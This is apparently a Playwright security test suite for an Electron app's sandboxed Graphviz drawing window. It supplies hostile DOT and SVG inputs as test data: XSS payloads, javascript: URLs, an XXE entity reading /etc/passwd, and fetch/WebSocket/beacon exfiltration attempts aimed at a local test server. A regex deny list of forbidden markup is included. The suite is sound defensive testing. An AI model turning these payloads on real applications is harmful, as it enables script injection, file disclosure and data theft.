import { expect, test, type ElectronApplication, type Page } from "@playwright/test";
import { mkdtempSync, readFileSync, writeFileSync } from "node:fs";
import { createServer } from "node:http";
import type { AddressInfo } from "node:net";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { PNG } from "pngjs";
import { FIGURE_IMAGE_MAX, figureImages } from "../../src/shared/smart-text";
import { figureProblem } from "../../src/shared/figure-kinds";
import { launchPyxis } from "./app-under-test";
import { removeTestFolder } from "./cleanup";
import { fromChiediToExams } from "./doors";
import { drawingPinned, pngSize, stagePacks, stagedDrawingPack } from "./drawing-packs";

// The drawing window runs text from an AI, or from a plan file somebody sent, through Graphviz. These checks use the real
// window, with the drawing pack only (Python is not staged: graphs need nothing else), and reach it through the handle
// main installs for tests (`pyxisE2eDraw`, see drawTestHandle in src/main/draw-runtime.ts). Nothing here depends on a
// path or a line ending of the machine: the hostile paths are strings inside DOT, which nothing reads.

type Drawn = { image: string } | { error: string; timedOut?: boolean };
type Handle = {
  draw: (payload: unknown) => Promise<Drawn>;
  drawUnchecked: (payload: unknown) => Promise<Drawn>;
  windows: () => number[];
  preferences: () => Record<string, unknown>;
  evaluate: (script: string) => Promise<unknown>;
};

const draw = (app: ElectronApplication, code: string, extra: Record<string, unknown> = {}) =>
  app.evaluate((_, payload) => (globalThis as unknown as { pyxisE2eDraw: Handle }).pyxisE2eDraw.draw(payload), {
    kind: "graph",
    code,
    ...extra,
  });
const drawUnchecked = (app: ElectronApplication, code: string, extra: Record<string, unknown> = {}) =>
  app.evaluate((_, payload) => (globalThis as unknown as { pyxisE2eDraw: Handle }).pyxisE2eDraw.drawUnchecked(payload), {
    kind: "graph",
    code,
    ...extra,
  });
const windows = (app: ElectronApplication) =>
  app.evaluate(() => (globalThis as unknown as { pyxisE2eDraw: Handle }).pyxisE2eDraw.windows());
const inWindow = <T>(app: ElectronApplication, script: string) =>
  app.evaluate((_, text) => (globalThis as unknown as { pyxisE2eDraw: Handle }).pyxisE2eDraw.evaluate(text), script) as Promise<T>;

const automaton = [
  "digraph automaton {",
  "  rankdir=LR; node [shape=circle fontname=\"Helvetica\"];",
  "  start [shape=point]; q2 [shape=doublecircle];",
  "  start -> q0; q0 -> q1 [label=\"a\"]; q1 -> q2 [label=\"b\"]; q2 -> q0 [label=\"c\"]; q1 -> q1 [label=\"a\"];",
  "}",
].join("\n");

/** A graph of n nodes in a ring with a chord from each: n nodes and 2n edges, drawn by the layout asked for. */
const ring = (n: number, layout = "dot") =>
  `digraph { layout=${layout}; ${Array.from({ length: n }, (_, i) => `a${i} -> a${(i + 1) % n}; a${i} -> a${(i + 7) % n}`).join("; ")} }`;

async function start(extra: { env?: Record<string, string> } = {}) {
  const userData = mkdtempSync(join(tmpdir(), "pyxis-drawing-"));
  // Only the drawing pack: a graph needs no Python.
  stagePacks(userData, ["drawing"]);
  const app = await launchPyxis({ userData, env: { HOME: userData, ...extra.env } });
  const page = await app.firstWindow();
  await page.getByRole("button", { name: "Salta" }).click();
  await fromChiediToExams(page);
  return { app, page, userData };
}
const finish = async (app: ElectronApplication, userData: string) => {
  await app.close();
  removeTestFolder(userData);
};

/** A picture that came back: a PNG that a stored figure accepts, of a size that can be read, with ink on it. */
function expectPicture(result: Drawn, name: string) {
  expect(result, name).toHaveProperty("image");
  const image = (result as { image: string }).image;
  expect(Object.keys(figureImages({ "figure-test": image })), name).toEqual(["figure-test"]);
  expect(image.length, name).toBeLessThanOrEqual(FIGURE_IMAGE_MAX);
  const size = pngSize(image)!;
  // A layout can be tall and narrow (twopi draws a chain as a column), so the longest side is the one that must be readable.
  expect(Math.max(size.width, size.height), name).toBeGreaterThanOrEqual(200);
  expect(size.width, name).toBeLessThanOrEqual(2000);
  expect(size.height, name).toBeLessThanOrEqual(2000);
  const decoded = PNG.sync.read(Buffer.from(image.split(",")[1]!, "base64"));
  let dark = 0;
  for (let i = 0; i < decoded.data.length; i += 4) if (decoded.data[i]! < 128) dark++;
  // The ground is white, and the drawing is ink on it.
  expect(decoded.data[0], name).toBe(255);
  expect(dark, name).toBeGreaterThan(50);
}

/** What a result may be whatever the text was: a picture that passes, or a failure with a plain message. */
function expectPictureOrFailure(result: Drawn, name: string) {
  if ("image" in result) expect(pngSize(result.image), name).not.toBeNull();
  else expect(result.error, name).toMatch(/^[\x20-\x7e\u00a0-\uffff]{1,500}$/);
}

test.describe("the drawing window", () => {
  test.skip(!drawingPinned(), "Requires the pinned drawing fixtures in .tmp/drawing.");
  test.setTimeout(240000);

  test("draws a graph from its text, with the drawing pack alone, on every layout and line ending", async () => {
    const { app, userData } = await start();
    try {
      const drawn = await draw(app, automaton);
      expectPicture(drawn, "automaton");
      // Left to right, the automaton is wider than it is tall, and wide enough to read.
      expect(pngSize((drawn as { image: string }).image)!.width).toBeGreaterThanOrEqual(200);
      // The text as a Windows editor saves it.
      expectPicture(await draw(app, automaton.replaceAll("\n", "\r\n")), "automaton with CRLF endings");
      expectPicture(await draw(app, "graph { a -- b -- c; b -- d }"), "undirected");
      expectPicture(
        await draw(app, 'digraph { subgraph cluster_0 { label="Sistema"; a -> b } b -> c [label="à è ì ò ù"] }'),
        "a cluster and accents",
      );
      for (const layout of ["dot", "neato", "circo", "fdp", "twopi"])
        expectPicture(
          await draw(app, `digraph { layout=${layout}; node [shape=box]; start -> parse -> check -> run -> done; check -> fail -> start }`),
          layout,
        );
      // A figure drawn twice comes out the same size, and the window that drew them is one.
      const first = await draw(app, automaton);
      const second = await draw(app, automaton);
      expect(pngSize((first as { image: string }).image)).toEqual(pngSize((second as { image: string }).image));
      expect(await windows(app)).toHaveLength(1);
      // A text Graphviz cannot read comes back as a failure with its message, which the model can act on.
      const syntax = await draw(app, "digraph { a -> b [label=] }");
      expect(syntax).toHaveProperty("error");
      expect((syntax as { error: string }).error).toMatch(/\S/);
    } finally {
      await finish(app, userData);
    }
  });

  test("refuses the text its checks refuse before any window sees it", async () => {
    const { app, userData } = await start();
    try {
      const refused: Array<[string, string]> = [
        ['image="/etc/passwd"', 'digraph { a [image="/etc/passwd"] }'],
        ["a Windows path", 'digraph { a [image="C:\\\\Windows\\\\win.ini"] }'],
        ['URL="https://example.com"', 'digraph { a [URL="https://example.com"] }'],
        ["href", 'digraph { a -> b [href="https://example.com"] }'],
        ["imagepath", 'digraph { imagepath="/"; a }'],
        ["fontpath", 'digraph { graph [fontpath="/usr/share/fonts"]; a }'],
        ["shapefile", 'digraph { a [shape=custom shapefile="/etc/hosts"] }'],
        ["stylesheet", 'digraph { stylesheet="http://127.0.0.1/x.css"; a }'],
        ["an HTML-like label", 'digraph { a [label=<<TABLE HREF="http://x"><TR><TD><IMG SRC="/etc/passwd"/></TD></TR></TABLE>>] }'],
        ["layout=sfdp", "digraph { layout=sfdp; a -> b }"],
        ["more than 150 nodes", `digraph { ${Array.from({ length: 151 }, (_, i) => `n${i}`).join("; ")} }`],
        ["more than 300 edges", `digraph { ${Array.from({ length: 301 }, () => "a -> b").join("; ")} }`],
        ["more than 4000 characters", `digraph { a [label="${"x".repeat(4000)}"] }`],
      ];
      for (const [name, code] of refused) {
        const result = await draw(app, code);
        expect(result, name).toHaveProperty("error");
        expect((result as { error: string }).error, name).not.toMatch(/^runtime-/);
        // The shared check says the same, and its message names what to change.
        if (code.length <= 4000) expect((result as { error: string }).error, name).toBe(figureProblem("graph", code));
      }
      // No drawing was asked of a window: none was opened.
      expect(await windows(app)).toEqual([]);
      // A request that is not a graph, or not even a request, is refused the same way.
      const odd = await app.evaluate(async () => {
        const h = (globalThis as unknown as { pyxisE2eDraw: Handle }).pyxisE2eDraw;
        return [
          await h.draw({ kind: "molecule", code: "CCO" }),
          await h.draw({ kind: "graph" }),
          await h.draw(null),
          await h.draw({ kind: "graph", code: 7 }),
        ];
      });
      for (const result of odd) expect(result).toEqual({ error: "runtime-draw-input-invalid" });
      expect(await windows(app)).toEqual([]);
    } finally {
      await finish(app, userData);
    }
  });

  test("makes no request to a local server whatever the text says, even text the checks would refuse", async () => {
    const arrived: string[] = [];
    const server = createServer((request, response) => {
      arrived.push(`${request.method} ${request.url}`);
      response.end("leaked");
    });
    await new Promise<void>((resolve) => server.listen(0, "127.0.0.1", resolve));
    const leak = `http://127.0.0.1:${(server.address() as AddressInfo).port}`;
    const { app, page, userData } = await start();
    try {
      // The text goes to the window as it is: the point is what the window does with what the checks stop elsewhere.
      const hostile: Record<string, string> = {
        url: `digraph { a [URL="${leak}/url"]; a -> b [href="${leak}/href" labelURL="${leak}/label" edgeURL="${leak}/edge"] }`,
        image: `digraph { imagepath="${leak}"; a [image="${leak}/image.png" shape=box]; b [shape=custom shapefile="${leak}/shape"] }`,
        html: `digraph { a [label=<<TABLE HREF="${leak}/table"><TR><TD><IMG SRC="${leak}/img.png"/></TD><TD HREF="${leak}/td">x</TD></TR></TABLE>>] }`,
        stylesheet: `digraph { stylesheet="${leak}/style.css"; fontpath="${leak}"; a -> b }`,
        id: `digraph { id="x\\"><script src=\\"${leak}/s.js\\"></script>"; a [id="<img src=${leak}/id>"] -> b }`,
        label: `digraph { a [label="<img src=${leak}/l> &lt;script&gt; \\"><svg onload=fetch('${leak}/x')>"] }`,
        tooltip: `digraph { a [tooltip="${leak}/t" comment="${leak}/c" target="_blank" URL="javascript:fetch('${leak}/j')"] }`,
        windowsPaths: 'digraph { a [image="C:\\\\Windows\\\\win.ini"]; b [image="\\\\\\\\server\\\\share\\\\x.png"] ; c [image="/etc/passwd"] }',
      };
      for (const [name, code] of Object.entries(hostile)) expectPictureOrFailure(await drawUnchecked(app, code), name);
      // The same through the request core makes: the checks refuse what names a file, a link or an element, so the window
      // is not asked. A label that only holds markup is a quoted string, which is drawn as the text it is.
      for (const [name, code] of Object.entries(hostile)) {
        const checked = await draw(app, code);
        if (name === "label") expectPicture(checked, name);
        else expect(checked, name).toEqual({ error: figureProblem("graph", code) });
      }

      // Hostile SVG, the other half: what Graphviz could never write is given to the page's own cleaning and rasterising,
      // to show that the page defends itself and is not trusting the renderer.
      const svg = (inner: string, extra = "") =>
        `<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="60pt" height="40pt" viewBox="0 0 60 40" ${extra}><polygon fill="red" points="0,0 60,0 60,40 0,40"/>${inner}</svg>`;
      const corpus: Record<string, string> = {
        script: svg("<script>window.__pwned = 1</script>"),
        onload: svg("", 'onload="window.__pwned = 2"'),
        handler: svg('<text x="1" y="10" onclick="window.__pwned = 3" onmouseover="window.__pwned = 4">x</text>'),
        foreignObject: svg(`<foreignObject width="40" height="40"><iframe xmlns="http://www.w3.org/1999/xhtml" src="${leak}/frame"></iframe><img xmlns="http://www.w3.org/1999/xhtml" src="${leak}/fo.png"/></foreignObject>`),
        image: svg(`<image href="${leak}/i.png" width="10" height="10"/><image xlink:href="${leak}/j.png" width="10" height="10"/>`),
        use: svg(`<use href="${leak}/x.svg#a"/><use xlink:href="${leak}/y.svg#b"/>`),
        link: svg(`<a href="javascript:window.__pwned = 5"><text x="1" y="10">x</text></a><a xlink:href="${leak}/link"><text x="1" y="20">y</text></a>`),
        style: svg(`<style>@import url(${leak}/c.css); polygon { fill: url(${leak}/f) }</style>`),
        filter: svg(`<filter id="f"><feImage href="${leak}/fe.png"/></filter><rect filter="url(#f)" width="5" height="5"/>`),
        animate: svg('<set attributeName="onmouseover" to="window.__pwned = 6"/><animate attributeName="href" values="javascript:window.__pwned = 7"/>'),
        fillUrl: svg(`<polygon fill="url(${leak}/f.svg#x)" points="0,0 5,5 0,5"/>`),
        styleAttribute: svg(`<polygon style="fill:url(${leak}/s)" points="0,0 5,5 0,5"/>`),
        dataUri: svg('<image href="data:image/svg+xml;base64,PHN2Zy8+" width="5" height="5"/>'),
        entity: `<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY secret SYSTEM "file:///etc/passwd">]><svg xmlns="http://www.w3.org/2000/svg" width="60pt" height="40pt"><text>&secret;</text></svg>`,
        entityHttp: `<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY secret SYSTEM "${leak}/entity">]><svg xmlns="http://www.w3.org/2000/svg" width="60pt" height="40pt"><text>&secret;</text></svg>`,
        nested: svg(`<svg><svg onload="window.__pwned = 8"><script>window.__pwned = 9</script></svg></svg>`),
        mathml: svg('<math><mi xlink:href="javascript:window.__pwned = 10">x</mi></math>'),
        notSvg: `<html><body><script>window.__pwned = 11</script></body></html>`,
        empty: "",
      };
      for (const [name, text] of Object.entries(corpus)) {
        const cleaned = await inWindow<{ ok: boolean; svg?: string; error?: string }>(
          app,
          `window.pyxisDraw.clean(${JSON.stringify(text)})`,
        );
        if (cleaned.ok) {
          const markup = cleaned.svg!;
          for (const forbidden of [
            /<script/i, /<foreignobject/i, /<image/i, /<use[\s>/]/i, /<a[\s>]/i, /<style/i, /<iframe/i, /<set[\s>/]/i,
            /<animate/i, /<filter/i, /<feimage/i, /\son\w+\s*=/i, /href\s*=/i, /javascript:/i, /\bsrc\s*=/i, /<!entity/i,
            /url\(\s*['"]?(?!#)/i, /data:/i, /<math/i, /127\.0\.0\.1/,
          ])
            expect(markup, `${name} must not keep ${forbidden}`).not.toMatch(forbidden);
        } else expect(cleaned.error, name).toMatch(/\S/);
        // Whatever it was, rasterising it gives a picture or a failure, and runs nothing.
        const picture = await inWindow<{ ok: boolean; png?: string; error?: string }>(
          app,
          `window.pyxisDraw.fromSvg(${JSON.stringify(text)})`,
        );
        if (picture.ok) expect(pngSize(picture.png!), name).not.toBeNull();
        else expect(picture.error, name).toMatch(/\S/);
      }
      expect(await inWindow<string>(app, "typeof window.__pwned")).toBe("undefined");
      expect(await inWindow<number>(app, "document.scripts.length")).toBe(1);
      expect(await inWindow<string>(app, "location.href")).toBe("pyxis-runtime://draw/index.html");
      // Time for any late request to arrive.
      await page.waitForTimeout(1000);
      expect(arrived).toEqual([]);
      // The server does record what reaches it: the app's own process, which has a network, is heard.
      await app.evaluate((_, url) => fetch(url).then((reply) => reply.text()), `${leak}/control`);
      expect(arrived).toEqual(["GET /control"]);
    } finally {
      await finish(app, userData);
      await new Promise((resolve) => server.close(resolve));
    }
  });

  test("has no way out: no network of any kind, no files, no Node, no new window, and nothing else of the app", async () => {
    const arrived: string[] = [];
    const server = createServer((request, response) => {
      arrived.push(`${request.method} ${request.url}`);
      response.end("leaked");
    });
    await new Promise<void>((resolve) => server.listen(0, "127.0.0.1", resolve));
    const port = (server.address() as AddressInfo).port;
    const leak = `http://127.0.0.1:${port}`;
    const { app, page, userData } = await start();
    try {
      expectPicture(await draw(app, automaton), "the window is open");
      const before = await app.evaluate(({ BrowserWindow }) => BrowserWindow.getAllWindows().length);

      // How the window was made, read from main.
      const made = await app.evaluate(({ BrowserWindow, session }) => {
        const target = BrowserWindow.getAllWindows().find((candidate) => candidate.webContents.getURL().startsWith("pyxis-runtime://draw/"))!;
        return {
          visible: target.isVisible(),
          persistent: target.webContents.session.isPersistent(),
          storagePath: target.webContents.session.storagePath ?? null,
          ownSession: target.webContents.session !== session.defaultSession,
          url: target.webContents.getURL(),
          preferences: (globalThis as unknown as { pyxisE2eDraw: Handle }).pyxisE2eDraw.preferences(),
        };
      });
      expect(made).toMatchObject({
        visible: false,
        persistent: false,
        storagePath: null,
        ownSession: true,
        url: "pyxis-runtime://draw/index.html",
      });
      // The window is made sandboxed, without Node, isolated, with web security and no preload.
      expect(made.preferences).toMatchObject({
        sandbox: true,
        nodeIntegration: false,
        contextIsolation: true,
        webSecurity: true,
        webviewTag: false,
        devTools: false,
      });
      expect(made.preferences).not.toHaveProperty("preload");
      // What the page can see: nothing of Node and nothing of the app's own bridge.
      expect(
        await inWindow<string[]>(
          app,
          "['require','process','module','Buffer','global','pyxis','electron','ipcRenderer','__dirname'].filter((name) => typeof globalThis[name] !== 'undefined')",
        ),
      ).toEqual([]);

      // Every way a page reaches out, tried by the page itself. `settled` says what each did: only "blocked" is a pass.
      const attempts = await inWindow<Record<string, string>>(
        app,
        `(async () => {
          const settle = (promise) => promise.then(() => "reached", () => "blocked");
          const load = (tag, props) => new Promise((resolve) => {
            const element = document.createElement(tag);
            element.onload = () => resolve("reached");
            element.onerror = () => resolve("blocked");
            Object.assign(element, props);
            document.head.append(element);
            setTimeout(() => resolve("blocked"), 1500);
          });
          const out = {};
          out.fetch = await settle(fetch(${JSON.stringify(leak + "/fetch")}));
          out.fetchNoCors = await settle(fetch(${JSON.stringify(leak + "/nocors")}, { mode: "no-cors" }));
          out.fetchFile = await settle(fetch("file:///etc/hostname"));
          out.fetchOtherHost = await settle(fetch("pyxis-runtime://sandbox/host.js"));
          out.xhr = await settle(new Promise((resolve, reject) => { const x = new XMLHttpRequest(); x.open("GET", ${JSON.stringify(leak + "/xhr")}); x.onload = resolve; x.onerror = reject; x.send(); }));
          out.image = await load("img", { src: ${JSON.stringify(leak + "/image.png")} });
          out.script = await load("script", { src: ${JSON.stringify(leak + "/script.js")} });
          out.stylesheet = await load("link", { rel: "stylesheet", href: ${JSON.stringify(leak + "/style.css")} });
          out.otherHostScript = await load("script", { src: "pyxis-runtime://sandbox/host.js" });
          out.packWheel = await settle(import("pyxis-runtime://draw/drawing/schemdraw-0.23-py3-none-any.whl"));
          out.pythonFile = await settle(import("pyxis-runtime://draw/pyodide/pyodide.js"));
          out.importRemote = await settle(import(${JSON.stringify(leak + "/module.js")}));
          out.websocket = await settle(new Promise((resolve, reject) => { try { const s = new WebSocket(${JSON.stringify(leak.replace("http", "ws") + "/ws")}); s.onopen = resolve; s.onerror = reject; s.onclose = reject; } catch (e) { reject(e); } }));
          out.eventSource = await settle(new Promise((resolve, reject) => { const s = new EventSource(${JSON.stringify(leak + "/events")}); s.onopen = resolve; s.onerror = reject; }));
          // A beacon is queued and says true; the server's count at the end shows that it went nowhere.
          navigator.sendBeacon?.(${JSON.stringify(leak + "/beacon")}, "x");
          out.worker = await settle(new Promise((resolve, reject) => { try { const w = new Worker("pyxis-runtime://draw/draw-host.js"); w.onmessage = resolve; w.onerror = reject; setTimeout(reject, 800); } catch (e) { reject(e); } }));
          const frame = document.createElement("iframe");
          frame.src = ${JSON.stringify(leak + "/frame")};
          document.body.append(frame);
          const form = document.createElement("form");
          form.action = ${JSON.stringify(leak + "/form")};
          form.method = "post";
          document.body.append(form);
          try { form.submit(); } catch (e) {}
          out.open = String(window.open(${JSON.stringify(leak + "/open")}));
          // Inline script and string evaluation, which the CSP does not allow.
          const inline = document.createElement("script");
          inline.textContent = "window.__inline = 1";
          document.head.append(inline);
          out.inlineScript = typeof window.__inline === "undefined" ? "blocked" : "ran";
          try { setTimeout("window.__timer = 1", 0); } catch (e) {}
          await new Promise((resolve) => setTimeout(resolve, 50));
          out.timerString = typeof window.__timer === "undefined" ? "blocked" : "ran";
          // The one control: the window's own library does load.
          out.control = await settle(import("pyxis-runtime://draw/drawing/graphviz.js"));
          setTimeout(() => { location.href = ${JSON.stringify(leak + "/navigate")}; }, 0);
          return out;
        })()`,
      );
      expect(attempts).toEqual({
        fetch: "blocked",
        fetchNoCors: "blocked",
        fetchFile: "blocked",
        fetchOtherHost: "blocked",
        xhr: "blocked",
        image: "blocked",
        script: "blocked",
        stylesheet: "blocked",
        otherHostScript: "blocked",
        packWheel: "blocked",
        pythonFile: "blocked",
        importRemote: "blocked",
        websocket: "blocked",
        eventSource: "blocked",
        worker: "blocked",
        open: "null",
        inlineScript: "blocked",
        timerString: "blocked",
        control: "reached",
      });
      await page.waitForTimeout(1500);
      // The navigation was refused: the window is where it was, no window was added, and the server saw nothing.
      expect(await inWindow<string>(app, "location.href")).toBe("pyxis-runtime://draw/index.html");
      expect(await app.evaluate(({ BrowserWindow }) => BrowserWindow.getAllWindows().length)).toBe(before);
      expect(arrived).toEqual([]);
      // The server does record what reaches it: the app's own process, which has a network, is heard.
      await app.evaluate((_, url) => fetch(url).then((reply) => reply.text()), `${leak}/control`);
      expect(arrived).toEqual(["GET /control"]);
      // And the window still draws.
      expectPicture(await draw(app, automaton), "after the attempts");
    } finally {
      await finish(app, userData);
      await new Promise((resolve) => server.close(resolve));
    }
  });

  test("stops a drawing that runs over its time, replaces a crashed window, queues requests, and refuses a damaged pack file", async () => {
    const { app, page, userData } = await start();
    try {
      // A graph at the limits (150 nodes, 300 edges) passes the checks, and ends in a picture or at the time limit.
      const dense = ring(150, "neato");
      expect(figureProblem("graph", dense)).toBeNull();
      const started = Date.now();
      const heavy = await draw(app, dense);
      expect(Date.now() - started).toBeLessThan(30000);
      expectPictureOrFailure(heavy, "a graph at the limits");
      if ("error" in heavy) expect(heavy.timedOut, "it stopped at the time limit").toBe(true);

      // A drawing that runs over its time destroys the window, and the next request gets a new one.
      expectPicture(await draw(app, automaton), "before the time limit");
      const [open] = await windows(app);
      expect(open).toBeDefined();
      const slow = await draw(app, ring(150, "neato"), { timeoutMs: 50 });
      expect(slow).toMatchObject({ timedOut: true });
      expect((slow as { error: string }).error).toMatch(/longer than 0\.05 seconds/);
      expect(await windows(app)).toEqual([]);
      expectPicture(await draw(app, automaton), "after the time limit");
      const [replaced] = await windows(app);
      expect(replaced).toBeDefined();
      expect(replaced).not.toBe(open);

      // A crashed window is replaced on the next request.
      await app.evaluate(({ BrowserWindow }) => {
        BrowserWindow.getAllWindows()
          .find((candidate) => candidate.webContents.getURL().startsWith("pyxis-runtime://draw/"))
          ?.webContents.forcefullyCrashRenderer();
      });
      await expect.poll(() => windows(app)).toEqual([]);
      expectPicture(await draw(app, automaton), "after a crash");
      const [afterCrash] = await windows(app);
      expect(afterCrash).not.toBe(replaced);

      // Requests queue: several at once all come back, one window drew them, and none was lost to another.
      const sizes = await Promise.all(
        [automaton, "graph { a -- b }", "digraph { x -> y -> z }", ring(20), "digraph { p -> q }"].map((code) => draw(app, code)),
      );
      sizes.forEach((result, index) => expectPictureOrFailure(result, `queued ${index}`));
      expect(sizes.filter((result) => "image" in result).length).toBeGreaterThanOrEqual(4);
      expect(await windows(app)).toHaveLength(1);

      // A file of the pack that no longer matches its hash is not served, so the window cannot load it: no picture, no
      // fault of the figure, and the window is replaced so that a repaired pack is read again.
      await page.evaluate(() => window.pyxis.invoke("tools.runtime", {}));
      const library = join(stagedDrawingPack(userData), "graphviz.js");
      const original = readFileSync(library);
      const changed = Buffer.from(original);
      changed[1000] = changed[1000]! ^ 0xff;
      // A new window is needed to read the library again, so the one that holds it is stopped first.
      await app.evaluate(({ BrowserWindow }) => {
        BrowserWindow.getAllWindows()
          .find((candidate) => candidate.webContents.getURL().startsWith("pyxis-runtime://draw/"))
          ?.webContents.forcefullyCrashRenderer();
      });
      await expect.poll(() => windows(app)).toEqual([]);
      writeFileSync(library, changed);
      const damaged = await draw(app, automaton);
      expect(damaged).toEqual({ error: "runtime-draw-library-missing" });
      expect(await windows(app)).toEqual([]);
      writeFileSync(library, original);
      expectPicture(await draw(app, automaton), "after the pack file was repaired");
    } finally {
      await finish(app, userData);
    }
  });
});

test.describe("without the drawing pack", () => {
  test("a request fails as the runtime's, with no window", async () => {
    const userData = mkdtempSync(join(tmpdir(), "pyxis-drawing-none-"));
    const app = await launchPyxis({ userData, env: { HOME: userData } });
    try {
      const page: Page = await app.firstWindow();
      await page.getByRole("button", { name: "Salta" }).click();
      await fromChiediToExams(page);
      expect(await draw(app, automaton)).toEqual({ error: "runtime-missing" });
      expect(await windows(app)).toEqual([]);
    } finally {
      await finish(app, userData);
    }
  });
});
